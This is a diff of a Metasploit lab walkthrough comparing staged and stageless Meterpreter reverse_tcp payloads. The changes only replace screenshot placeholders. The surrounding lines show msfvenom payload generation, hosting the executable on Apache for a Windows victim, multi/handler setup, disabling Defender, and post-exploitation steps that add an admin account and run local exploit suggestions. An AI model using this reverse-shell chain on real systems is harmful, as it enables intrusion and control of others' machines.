@@ -73,7 +73,7 @@ LHOST=192.168.56.101 LPORT=443 \
 -f exe -o /home/kali/msf/staged.exe
 ```
 
-[INSERT SCREENSHOT: Generating the staged payload with msfvenom]
+![generating payload](screenshots/cpcmd.png)
 
 > **Why this payload:** `windows/meterpreter/reverse_tcp` explicitly tells Metasploit this will be a **staged** Meterpreter payload.
 
@@ -92,7 +92,7 @@ The payload is now accessible from the victim via:
 http://192.168.56.101/staged.exe
 ```
 
-[INSERT SCREENSHOT: Apache hosting the payload]
+![Apache hosting the payload](screenshots/download.png)
 
 ---
 
@@ -107,7 +107,8 @@ set LPORT 443
 exploit -j
 ```
 
-[INSERT SCREENSHOT: Multi/handler configured for staged payload]
+![Multi/handler configured for staged payloadext](<screenshots/staged -1 .png>)
+![Multi/handler configured for staged payload](<screenshots/staged -2 .png>)
 
 > **Pro-Tip:** The handler payload **must match exactly** what was used in `msfvenom`.
 
@@ -119,15 +120,14 @@ On the Windows target:
 - Disable Firewall and Defender
 - Download and execute `staged.exe`
 
-[INSERT SCREENSHOT: Executing staged payload on victim]
-
+![Executing staged payload on victim](screenshots/windowsdefenderoff2.png)
 ---
 
 ### Step 5: Meterpreter Session Opened
 
 Once executed, a Meterpreter session opens:
 
-[INSERT SCREENSHOT: Meterpreter session opened – staged]
+![Meterpreter session opened – staged](screenshots/staged -3.png)
 
 You now have interactive access to the system.
 
@@ -153,7 +153,7 @@ Run local exploit suggestions:
 run post/multi/recon/local_exploit_suggester
 ```
 
-[INSERT SCREENSHOT: Admin account creation and recon output]
+![Admin account creation and recon output](screenshots/addeduserwin.png)
 
 ---
 
@@ -177,7 +177,7 @@ LHOST=192.168.56.101 LPORT=443 \
 -f exe -o /home/kali/msf/stageless.exe
 ```
 
-[INSERT SCREENSHOT: Generating the stageless payload with msfvenom]
+![generating payload](screenshots/cpcmd.png)
 
 > **Key difference:** Notice the underscore: `meterpreter_reverse_tcp` = **stageless**.
 
@@ -207,7 +207,7 @@ set LPORT 443
 exploit -j
 ```
 
-[INSERT SCREENSHOT: Multi/handler for stageless payload]
+![Multi/handler for stageless payload](screenshots/msfcons1.png)
 
 ---
 
@@ -215,7 +215,7 @@ exploit -j
 
 Once the victim runs the executable:
 
-[INSERT SCREENSHOT: Meterpreter session opened – stageless]
+![Multi/handler for stageless payload](screenshots/msfcons2.png)
 
 The session opens immediately without staging.
 
@@ -243,7 +243,7 @@ Run recon modules:
 run post/multi/recon/local_exploit_suggester
 ```
 
-[INSERT SCREENSHOT: Post-exploitation with stageless payload]
+![postexploit](<screenshots/last win.png>)
 
 ---
 
